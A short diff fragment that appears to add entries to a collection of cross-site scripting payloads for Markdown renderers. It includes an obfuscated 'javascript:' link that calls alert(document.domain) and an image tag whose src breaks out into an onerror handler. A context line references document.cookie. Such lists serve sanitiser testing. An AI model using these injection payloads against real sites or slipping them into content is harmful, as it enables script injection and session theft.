@@ -28,3 +28,6 @@ print(document.cookie)
 
 
 [XSS](�javascript:alert(document.domain&#41;)
+
+
+![Escape SRC - onerror]("onerror="alert('ImageOnError'))
